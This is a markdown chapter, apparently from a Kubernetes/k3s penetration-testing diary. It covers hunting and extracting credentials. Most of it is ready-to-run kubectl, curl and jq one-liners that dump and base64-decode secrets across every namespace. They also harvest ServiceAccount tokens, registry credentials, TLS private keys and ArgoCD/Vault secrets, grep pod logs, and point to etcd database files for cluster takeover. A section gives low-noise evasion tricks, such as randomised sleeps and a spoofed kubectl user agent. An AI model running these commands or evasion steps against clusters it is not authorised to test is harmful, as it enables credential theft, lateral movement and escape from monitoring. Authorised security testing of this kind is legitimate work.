
# 📄 **12_secrets.md**

### *Phase 3 — Secrets, Credential Hunting & Exfiltration*

**Mi Familia Edition — Kubernetes / k3s Pentest Diary**

---

````markdown
# 12 — Secret Hunting & Credential Extraction  
### Phase 3: Exploiting Kubernetes’ Most Valuable Asset  
**Secrets = The money. The keys. The passports.**  
Every meaningful Kubernetes compromise involves secret abuse.

This module covers:
- Full secrets enumeration  
- Cross-namespace credential extraction  
- Pattern-based secrets discovery  
- Operator secret harvesting  
- SA token extraction  
- Exposed credentials inside ConfigMaps / env / volumes  
- Cloud provider key leaks  
- Database/API credential identification  
- Real-world escalation chains  

---

# 🧬 1. Why Secrets Are the #1 Pivot Vector

Secrets stored in Kubernetes (apiKey, token, password, certs…) often grant:
- Database access  
- Internal service access  
- CI/CD credentials  
- Cloud provider IAM rights  
- TLS private keys for ingress gateways  
- Admin service tokens  
- OIDC/JWT signing keys (catastrophic)  
- Higher-privilege ServiceAccount tokens  

Even partial read access → **total lateral movement**.

---

# 🔍 2. Enumerate Secrets in Current Namespace

```bash
kcurl "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets" | jq .
````

### List only names:

```bash
kcurl "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets" \
  | jq -r '.items[].metadata.name'
```

### Show secret types:

```bash
kcurl "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets" \
  | jq -r '.items[] | "\(.metadata.name) — \(.type)"'
```

Common high-value types:

* `kubernetes.io/service-account-token`
* `kubernetes.io/dockerconfigjson`
* `Opaque`
* `kubernetes.io/tls`

---

# 🌐 3. Enumerate Secrets Across All Namespaces

If your token can list secrets cluster-wide →
**game over for the cluster.**

```bash
for ns in $(kcurl "$APISERVER/api/v1/namespaces" | jq -r '.items[].metadata.name'); do
  echo "=== $ns ==="
  kcurl "$APISERVER/api/v1/namespaces/$ns/secrets"
done
```

### Extract only names:

```bash
kcurl "$APISERVER/api/v1/secrets" | jq -r '.items[].metadata.name'
```

---

# 🧪 4. Decode Secrets Automatically

Kubernetes secret values are Base64 encoded.

Decode all fields:

```bash
kcurl "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets/mysecret" \
 | jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d)"'
```

---

# 🔥 5. Pattern-Based Secret Hunting (High Impact)

Search for likely credentials inside all secrets:

```bash
kcurl "$APISERVER/api/v1/secrets" \
 | jq '.items[] | select(.data | to_entries[]? | .value | @base64d | test("key|token|secret|pass|aws|gcp|azure|ssh"; "i"))'
```

Patterns to look for:

* `access_key`, `secret_key`
* `password`, `dbpass`, `redis_pass`
* `aws_access_key_id`, `aws_secret_access_key`
* `gh_token`, `slack_token`, `gitlab_token`
* `ssh-key`, `tls.key`

---

# 🏦 6. ServiceAccount Token Harvesting (Critical)

### Identify SA tokens:

```bash
kcurl "$APISERVER/api/v1/secrets" \
 | jq '.items[] | select(.type=="kubernetes.io/service-account-token")'
```

Decode the token:

```bash
TOKEN=$(kcurl "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets/sa-token" \
  | jq -r '.data.token' | base64 -d)
```

SA tokens unlock:

* Namespace access
* Pod exec
* Secrets
* Workload modification
* RBAC escalation
* Cluster-level operators

SA token exposure is one of the most common production misconfigs.

---

# 🎯 7. Look for Exposed Secrets in ConfigMaps

**One of the most common weaknesses in real-world clusters.**

Search all ConfigMaps:

```bash
kcurl "$APISERVER/api/v1/configmaps" \
 | jq '.items[] | select(.data | to_entries[]? | .value | test("pass|secret|token|key|auth|credential"; "i"))'
```

ConfigMaps are *not meant for credentials*, yet developers routinely store:

* DB passwords
* JWT signing secrets
* API tokens
* OAuth credentials
* Internal service creds

---

# 🧩 8. Environment Variable Secrets (Often Forgotten)

Extract `env` from pod specs:

```bash
kcurl "$APISERVER/api/v1/pods" \
  | jq '.items[] | {pod: .metadata.name, env: .spec.containers[].env}'
```

Common leaks:

* `DATABASE_URL`
* `REDIS_URL`
* `CLOUD_API_KEY`
* `TOKEN`
* `PASSWORD`
* `AWS_ROLE_ARN`

---

# 🔌 9. Mounted Volumes (Secret & TLS Leaks)

List pod volume mounts:

```bash
kcurl "$APISERVER/api/v1/pods" \
 | jq '.items[] | {name: .metadata.name, volumes: .spec.volumes}'
```

Look for:

* `secret: { … }`
* `projected: { … }`
* `tls: { … }`
* `dockerconfigjson`

Mounts frequently contain:

* TLS private keys
* Database passwords
* ServiceAccount tokens
* .dockerconfig.json (registry creds)

---

# ⚙️ 10. Docker Registry Credentials (High-Value Cluster Pivot)

Registry secrets unlock:

* Private images
* Source code
* Internal tooling
* Ability to upload malicious images

List registry credentials:

```bash
kcurl "$APISERVER/api/v1/secrets" \
 | jq '.items[] | select(.type=="kubernetes.io/dockerconfigjson")'
```

Decode:

```bash
jq -r '.data.".dockerconfigjson" | @base64d'
```

---

# 🔱 11. TLS Certificate Theft (Ingress, Istio, Cluster PKI)

TLS secrets:

```bash
kcurl "$APISERVER/api/v1/secrets" \
 | jq '.items[] | select(.type=="kubernetes.io/tls")'
```

If attackers grab TLS private keys:

* Internal MITM becomes possible
* Ingress impersonation
* TLS offloading manipulation
* Identity forging for internal services

If cert-manager is present → escalate via issuing your own certs.

---

# 🛠️ 12. Operator Secret Stores (ArgoCD, Vault, Flux)

Operators often expose enormous privilege through secrets.

---

### ArgoCD:

```bash
kcurl "$APISERVER/api/v1/namespaces/argocd/secrets"
```

Look for:

* repository credentials
* SSH deploy keys
* GitHub PATs
* cluster credentials for sync

---

### Vault Agent Injector:

```bash
kcurl "$APISERVER/api/v1/namespaces/vault/secrets"
```

Sometimes leaks:

* vault root tokens
* static secrets
* app-role credentials

---

### Flux:

Look for:

* Git private key secrets
* Helm repo credentials
* S3 buckets

---

# 💣 13. Secrets in Logs (Rare but Devs Do It)

Check logs for accidental disclosure:

```bash
for p in $(kubectl get pods -A -o name); do
  kubectl logs $p 2>/dev/null | grep -E "pass|secret|token|key"
done
```

---

# 💥 14. Secrets in ETCD Dump (Cluster Root Access)

If you ever get node access to etcd:

Location (k3s):

```
/var/lib/rancher/k3s/server/db/state.db
```

Location (kubeadm):

```
/var/lib/etcd/member/snap/db
```

Decrypt etcd → **full cluster takeover**.

---

# 🔐 15. Exfiltration-safe Techniques (Low Noise)

To avoid raising alerts:

### Mask searches:

```bash
kcurl ... | sed 's/[A-Za-z0-9+\/]\{20,\}/<masked>/g'
```

### Limit rate:

```bash
sleep $((RANDOM % 5 + 1))
```

### Use legit UA:

```
kubectl/v1.29.0 (linux/amd64)
```

---

# 🔥 16. High-Impact One-Liners (Red Team Favorites)

### List secrets across all namespaces:

```bash
for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
  echo "=== $ns ==="
  kubectl get secrets -n $ns
done
```

### Extract + decode everything:

```bash
kubectl get secrets --all-namespaces -o json | \
jq -r '.items[] | "### \(.metadata.namespace)/\(.metadata.name)\n" + (.data | to_entries[]? | "\(.key)=\(.value|@base64d)")'
```

### Identify secrets not mounted anywhere (forgotten creds):

```bash
kubectl get secrets -A -o json \
 | jq '.items[] | select(.metadata.annotations."kubernetes.io/used-by" == null)'
```

---

# 🎯 17. Summary & Tactical Takeaways

Secrets define the **real security boundary** inside Kubernetes.

Detection signals:

* If you can list secrets → **medium severity**
* If you can read secrets → **high severity**
* If you can list secrets cross-namespace → **critical**
* If you can read secrets cross-namespace → **cluster compromised**

Secrets are the glue connecting:

* pods → workloads
* workloads → operators
* operators → nodes
* nodes → cloud providers

This phase usually identifies your first **major pivot.**

Proceed to:
➡️ **13_pods.md** (Pod Reconnaissance & Privilege Escalation)

```

